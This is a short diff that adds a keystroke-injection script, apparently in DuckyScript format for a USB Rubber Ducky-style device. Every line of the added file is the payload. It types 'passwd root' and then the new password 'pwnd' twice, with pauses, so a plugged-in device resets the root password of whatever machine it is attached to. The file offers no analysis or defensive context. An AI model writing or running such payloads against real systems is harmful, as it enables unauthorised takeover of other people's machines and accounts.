@@ -1,0 +1,6 @@
+
+STRINGLN passwd root
+DELAY 500
+STRINGLN pwnd
+DELAY 500
+STRINGLN pwnd
